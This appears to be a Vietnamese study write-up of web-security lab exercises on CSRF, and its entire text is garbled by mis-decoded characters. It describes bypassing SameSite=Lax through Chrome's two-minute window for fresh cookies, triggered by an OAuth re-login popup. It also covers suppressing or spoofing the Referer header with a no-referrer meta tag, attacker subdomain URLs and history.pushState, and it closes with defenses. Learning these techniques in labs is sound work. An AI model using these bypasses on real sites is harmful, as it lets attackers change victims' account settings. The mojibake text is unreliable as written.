## Bypass SameSite Lax báº±ng cÃ¡ch sá»­ dá»¥ng cookie vá»«a Ä‘Æ°á»£c táº¡o ra

Cookie `SameSite=Lax` thÆ°á»ng ko Ä‘Æ°á»£c gá»­i trong POST tá»« trang khÃ¡c (cross-site POST). 
NhÆ°ng **Chrome cÃ³ ngoáº¡i lá»‡**: Náº¿u cookie má»›i Ä‘Æ°á»£c táº¡o (vá»«a set) vÃ  ko cÃ³ thuá»™c tÃ­nh SameSite rÃµ rÃ ng, thÃ¬: 
- Chrome tá»± set `SameSite=Lax` máº·c Ä‘á»‹nh
- NhÆ°ng ko Ã¡p dá»¥ng háº¡n cháº¿ ngay láº­p tá»©c 

â¡ï¸ Trong 2 phÃºt Ä‘áº§u sau khi cookie Ä‘Æ°á»£c set, nÃ³ váº«n Ä‘Æ°á»£c gá»­i trong cÃ¡c POST cross-site. 
ğŸ‘‰ Káº» táº¥n cÃ´ng lá»£i dá»¥ng trong 2 phÃºt Ä‘áº§u Ä‘á»ƒ thá»±c hiá»‡n CSRF. 

Viá»‡c mÃ  khai thÃ¡c trong 2 phÃºt Ä‘áº§u nÃ y láº¡i ko thá»±c táº¿ láº¯m. NhÆ°ng mÃ  náº¿u tÃ¬m Ä‘Æ°á»£c 1 gadget trÃªn web cho phÃ©p buá»™c trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n nháº­n cookie phiÃªn má»›i, tá»« Ä‘Ã¢y mÃ¬nh chá»§ Ä‘á»™ng lÃ m má»›i cookie Ä‘á»ƒ táº¥n cÃ´ng CSRF â¡ï¸ vÃ­ dá»¥ lÃ  sau khi login láº¡i báº±ng OAuth, thÃ¬:
- âœ¨ Cookie má»›i náº±m trong 2 khoáº£ng 2 phÃºt => táº¥n cÃ´ng CSRF thÃ nh cÃ´ng. 

Äá»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y: 
- Redirect ngÆ°á»i dÃ¹ng tá»›i trang login OAuth (á»Ÿ top-level â¡ï¸ trÃ¬nh duyá»‡t gá»­i cookie OAuth)
- OAuth xá»­ lÃ½ xong â¡ï¸ cáº¥p session má»›i 
- Chuyá»ƒn hÆ°á»›ng ngÆ°á»i dÃ¹ng láº¡i site cá»§a attacker
- Attacker thá»±c hiá»‡n CSRF trong thá»i gian Ä‘ 

CÃ³ thá»ƒ má»Ÿ tab má»›i Ä‘á»ƒ lÃ m má»›i cookie mÃ  khÃ´ng rá»i khá»i trang táº¥n cÃ´ng, nhÆ°ng trÃ¬nh duyá»‡t sáº½ cháº·n popup náº¿u khÃ´ng cÃ³ thao tÃ¡c thá»§ cÃ´ng tá»« ngÆ°á»i dÃ¹ng. VÃ­ dá»¥, Ä‘oáº¡n code má»Ÿ popup sau Ä‘Ã¢y sáº½ bá»‹ trÃ¬nh duyá»‡t cháº·n theo máº·c Ä‘á»‹nh: 

```javascript
window.open('https://vulnerable-website.com/login/sso');
```

Tá»« Ä‘Ã¢y mÃ¬nh cÃ³ thá»ƒ wrap nÃ³ trong sá»± kiá»‡n `onclick`

```javascript
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```
Báº±ng cÃ¡ch nÃ y, phÆ°Æ¡ng thá»©c `window.open()` chá»‰ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng nháº¥p chuá»™t vÃ o má»™t vá»‹ trÃ­ nÃ o Ä‘Ã³ trÃªn trang.

## LAB09 

Lab nÃ y cÃ³ chá»©c nÄƒng `change-email`, vÃ  Ä‘Æ°á»£c cung cáº¥p 1 account lÃ  `wiener:peter`

![image](https://hackmd.io/_uploads/r1RCobxdge.png)

VÃ  tÃ i khoáº£n nÃ y Ä‘Æ°á»£c xÃ¡c minh. 

![image](https://hackmd.io/_uploads/B15b3Weugx.png)

Quan sÃ¡t trong thÃ¬ tháº¥y cÃ³ 1 request lÃ  `/oauth-callback?code=`

![image](https://hackmd.io/_uploads/rygKJMeugg.png)

Trong response cá»§a nÃ³ thÃ¬ cÃ³ Set-Cookie láº¡i ko cÃ³ thuá»™c tÃ­nh SameSite 

```HTTP
Set-Cookie: session=6baEDxaGayg0jARt1sfVlHCDN1gF7mKa; Expires=Wed, 06 Aug 2025 23:09:47 UTC; Secure; HttpOnly
```

VÃ  quan sÃ¡t trong pháº§n request vÃ  response thÃ¬ cÃ³ hai trÆ°á»ng cookie session Ä‘á»u khÃ¡c nhau. NghÄ©a lÃ  `oauth-callback` cÃ³ thá»ƒ Ä‘Ã£ refresh láº¡i cookie session nÃ y. 

Sau Ä‘Ã³ thÃ¬ nÃ³ sáº½ chuyá»ƒn mÃ¬nh vá» my-account. MÃ¬nh cÃ³ thá»ƒ thá»±c hiá»‡n chá»©c nÄƒng `change-email` bÃ¬nh thÆ°á»ng.

![image](https://hackmd.io/_uploads/BJ7DmMe_gg.png)

Quan sÃ¡t trong request hay response cÅ©ng Ä‘á»u ko cÃ³ csrf token. 

Do nÃ³ ko set SameSite thÃ¬ trong máº·c Ä‘á»‹nh nÃ³ sáº½ Ä‘Æ°á»£c gÃ¡n lÃ  Lax mÃ  Lax thÃ¬ nÃ³ sáº½ ko gá»­i ra báº±ng POST. 

Náº¿u váº­y mÃ¬nh thá»­ vá»›i payload bÃ¬nh thÆ°á»ng xem cÃ³ thá»ƒ thay Ä‘á»•i Ä‘Æ°á»£c email hay ko ? 

![image](https://hackmd.io/_uploads/r1sZvfeuxx.png)

Khhi mÃ¬nh thá»±c hiá»‡n payload nÃ y vÃ  view exploit thÃ¬ quan sÃ¡t nÃ³ tráº£ vá» ráº¥t nhanh => cho nÃªn lÃ  nÃ³ ko thá»ƒ khai thÃ¡c CSRF. VÃ¬ mÃ¬nh cáº§n loggin lÃ¢u hÆ¡n 2 phÃºt Ä‘á»ƒ nÃ³ chÆ°a gÃ¡n **SameSite=Lax**

Khi truy cáº­p `/social-login`, quÃ¡ trÃ¬nh OAuth sáº½ tá»± Ä‘á»™ng Ä‘Æ°á»£c khá»Ÿi táº¡o láº¡i. Náº¿u mÃ¬nh váº«n cÃ²n phiÃªn login vá»›i mÃ¡y chá»§ OAuth, nÃ³ diá»…n ra mÃ  ko cÃ³ báº¥t ká»³ tÆ°Æ¡ng tÃ¡c nÃ o. 

NhÆ° váº­y náº¿u mÃ¬nh truyá»n payload nhÆ° sau: 

![image](https://hackmd.io/_uploads/Syj1hfgdxe.png)

NghÄ©a lÃ  lá»£i dá»¥ng vÃ o trong flow OAuth sáº½ táº¡o ra 1 session má»›i, mÃ  trong lÃºc táº¡o má»›i thÃ¬ 2 phÃºt nÃ³ sáº½ ko gÃ¡n SameSite. 

NÃ³ hoÃ n toÃ n thÃ nh cÃ´ng khi quÃ¡ trÃ¬nh diá»…n ra Ã­t hÆ¡n 2 phÃºt vÃ  pháº£i trÃ¬nh duyá»‡t ko Ä‘Æ°á»£c block popup. 

NÃªn mÃ¬nh sáº½ dÃ¹ng gÃ³i cÃ¡i payload nhÆ° sau: 

![image](https://hackmd.io/_uploads/BkeiR6fgule.png)

## Bypass cÆ¡ cháº¿ phÃ²ng chá»‘ng CSRF dá»±a trÃªn header Referer 

DÃ¹ng Referer Ä‘á»ƒ chá»‘ng CSRF khÃ´ng an toÃ n â†’ váº«n bá»‹ attacker vÆ°á»£t qua báº±ng nhiá»u cÃ¡ch.

### Referer header 

**Header Referer** cho biáº¿t trang nguá»“n gá»­i request, nhÆ°ng nÃ³ lÃ  tÃ¹y chá»n vÃ  cÃ³ thá»ƒ bá»‹ xÃ³a hoáº·c thay Ä‘á»•i (vÃ­ dá»¥ do Referrer-Policy) nÃªn khÃ´ng Ä‘Ã¡ng tin cáº­y Ä‘á»ƒ báº£o vá»‡ CSRF.

## Viá»‡c xÃ¡c thá»±c Referer phá»¥ thuá»™c vÃ o viá»‡c header nÃ y cÃ³ tá»“n táº¡i 

Náº¿u á»©ng dá»¥ng bá» qua xÃ¡c thá»±c khi thiáº¿u Referer, attacker cÃ³ thá»ƒ khai thÃ¡c báº±ng cÃ¡ch lÃ m trÃ¬nh duyá»‡t khÃ´ng gá»­i Referer, vÃ­ dá»¥ thÃ´ng qua tháº» <meta> Ä‘áº·t chÃ­nh sÃ¡ch no-referrer

```HTML
<meta name="referrer" content="never">
``` 

### LAB10 

á» lab nÃ y mÃ¬nh Ä‘Æ°á»£c cung cáº¥p 1 account `wiener:peter`

![image](https://hackmd.io/_uploads/ryii7Xedle.png)

ThÃ¬ mÃ¬nh cÅ©ng thá»­ gá»­i payload Ä‘áº¿n server exploit nhÆ° sau: 

![image](https://hackmd.io/_uploads/HJImEQxdll.png)

ThÃ¬ mÃ¬nh nháº­n Ä‘Æ°á»£c 1 thÃ´ng bÃ¡o nhÆ° sau: 

![image](https://hackmd.io/_uploads/HJnDNmgdxg.png)

NhÆ° váº­y server dá»±a trÃªn Referer Ä‘á»ƒ xÃ¡c thá»±c. 
Cho nÃªn mÃ¬nh thÃªm payload nhÆ° sau: 

![image](https://hackmd.io/_uploads/S17eBXl_lx.png)

## XÃ¡c thá»±c Referer cÃ³ thá»ƒ bá»‹ phÃ¡ vá»¡ 

Náº¿u á»©ng dá»¥ng chá»‰ kiá»ƒm tra Referer báº±ng cÃ¡ch so sÃ¡nh chuá»—i báº¯t Ä‘áº§u, attacker cÃ³ thá»ƒ bypass báº±ng cÃ¡ch dÃ¹ng subdomain giáº£ máº¡o, vÃ­ dá»¥ `example.com.attacker.com`.

```URL
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

Náº¿u á»©ng dá»¥ng chá»‰ kiá»ƒm tra Referer cÃ³ chá»©a tÃªn miá»n, attacker cÃ³ thá»ƒ chÃ¨n domain vÃ o pháº§n query hoáº·c path cá»§a URL Ä‘á»ƒ bypass. 

```URL
http://attacker-website.com/csrf-attack?vulnerable-website.com
``` 

Do nhiá»u trÃ¬nh duyá»‡t máº·c Ä‘á»‹nh loáº¡i bá» query string khá»i Referer, attacker cáº§n thÃªm header Referrer-Policy: unsafe-url Ä‘á»ƒ Ä‘áº£m báº£o toÃ n bá»™ URL Ä‘Æ°á»£c gá»­i, giÃºp bypass kiá»ƒm tra dá»±a trÃªn substring.

### LAB11 

Lab nÃ y cÅ©ng Ä‘Æ°á»£c cung cáº¥p 1 account `wiener:peter` 

![image](https://hackmd.io/_uploads/SkkGKQeOle.png)

Khi thá»­ change-email thÃ¬ cÃ³ trÆ°á»ng Referer nhÆ° sau: 

![image](https://hackmd.io/_uploads/S1OPt7ldlg.png)

Náº¿u mÃ¬nh thay Ä‘á»•i trÆ°á»ng nÃ y thÃ¬ sao? 

![image](https://hackmd.io/_uploads/rkT5Kme_ge.png)

NhÆ° váº­y mÃ¬nh thÃªm 1 tham sá»‘ GET thÃ¬ nhÆ° tháº¿ nÃ o? 

![image](https://hackmd.io/_uploads/S11J5Qg_gl.png)

Yah nÃ³ váº«n hoáº¡t Ä‘á»™ng! 

Náº¿u nhÆ° vÃ¢y thÃ¬ mÃ¬nh cÃ³ thá»ƒ dÃ¹ng 1 hÃ m trong Js Ä‘Æ°á»£c gá»i lÃ  `history.pushState()` dÃ¹ng Ä‘á»ƒ thay Ä‘á»•i URL trÃªn thanh Ä‘á»‹a chá»‰ mÃ  khÃ´ng táº£i láº¡i trang vÃ  cho phÃ©p quáº£n lÃ½ lá»‹ch sá»­ trÃ¬nh duyá»‡t má»™t cÃ¡ch linh hoáº¡t.

![image](https://hackmd.io/_uploads/ryLHiXgugx.png)

## CÃ¡ch phÃ²ng chá»‘ng CSRF 

1. DÃ¹ng CSRF Tokens 
- CÃ¡ch phÃ²ng thá»§ cháº¯c cháº¯n nháº¥t lÃ  sá»­ dá»¥ng CSRF token.
- YÃªu cáº§u cÆ¡ báº£n cá»§a token:
    - CÃ³ Ä‘á»™ ngáº«u nhiÃªn cao, khÃ´ng thá»ƒ Ä‘oÃ¡n trÆ°á»›c.
    - Pháº£i liÃªn káº¿t cháº·t cháº½ vá»›i phiÃªn Ä‘Äƒng nháº­p cá»§a ngÆ°á»i dÃ¹ng 
    - ÄÆ°á»£c xÃ¡c thá»±c nghiÃªm ngáº·t á»Ÿ má»i request liÃªn quan Ä‘áº¿n hÃ nh Ä‘á»™ng nháº¡y cáº£m. 

- CÃ¡ch truyá»n token thÆ°á»ng dÃ¹ng: 
    - ThÃªm dÆ°á»›i dáº¡ng input áº©n trong form HTML, sá»­ dá»¥ng method POST Ä‘á»ƒ truyá»n dá»¯ liá»‡u.
    - KhÃ´ng nÃªn Ä‘Æ°a token vÃ o query string, vÃ¬ cÃ³ thá»ƒ bá»‹ ghi log, lá»™ qua header Referer, hoáº·c hiá»ƒn thá»‹ trong URL.
    - CÃ³ thá»ƒ Ä‘áº·t token trong custom header (qua JS) nhÆ° **X-Csrf-Token**, tuy an toÃ n nhÆ°ng yÃªu cáº§u dÃ¹ng XHR vÃ  cÃ³ thá»ƒ phá»©c táº¡p hÆ¡n.
- TrÃ¡nh dÃ¹ng cookie Ä‘á»ƒ truyá»n CSRF token - dá»… bá»‹ khai thÃ¡c. 

2. Ãp dá»¥ng Strict SameSite Cookie 
- Cáº¥u hÃ¬nh cookie vá»›i SameSite=Strict Ä‘á»ƒ ngÄƒn cháº·n CSRF hiá»‡u quáº£ hÆ¡n so vá»›i Lax, vÃ¬ Strict khÃ´ng gá»­i cookie trong request crossâ€‘site.
- HÃ£y tá»± Ä‘áº·t thuá»™c tÃ­nh SameSite thay vÃ¬ Ä‘á»ƒ trÃ¬nh duyá»‡t máº·c Ä‘á»‹nh xá»­ lÃ½ (vÃ¬ Chrome chá»‰ máº·c Ä‘á»‹nh lÃ  Lax).
- TrÆ°á»ng há»£p cáº§n dÃ¹ng cookie cross-site (vÃ­ dá»¥ OAuth/SSO), chá»‰ nÃªn dÃ¹ng Lax khi thá»±c sá»± cáº§n thiáº¿t vÃ  hiá»ƒu rÃµ rá»§i ro. 

3. Cáº£nh giÃ¡c vá»i cross-origin, same-site attacks. 
- Even khi cháº¿ Ä‘á»™ SameSite Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘Ãºng, cÃ¡c táº¥n cÃ´ng cÃ¹ng site nhÆ°ng khÃ¡c origin váº«n cÃ³ thá»ƒ bypass báº£o vá»‡.
- VÃ­ dá»¥: náº¿u cÃ³ XSS trÃªn sub-domain, attacker cÃ³ thá»ƒ táº¥n cÃ´ng lÃªn domain chÃ­nh thá»‘ng.
- VÃ¬ váº­y, nÃªn tÃ¡ch biá»‡t ná»™i dung khÃ´ng tin cáº­y vÃ  ná»™i dung nháº¡y cáº£m (vÃ­ dá»¥ lÆ°u file upload trÃªn domain khÃ¡c) Ä‘á»ƒ giáº£m rá»§i ro 


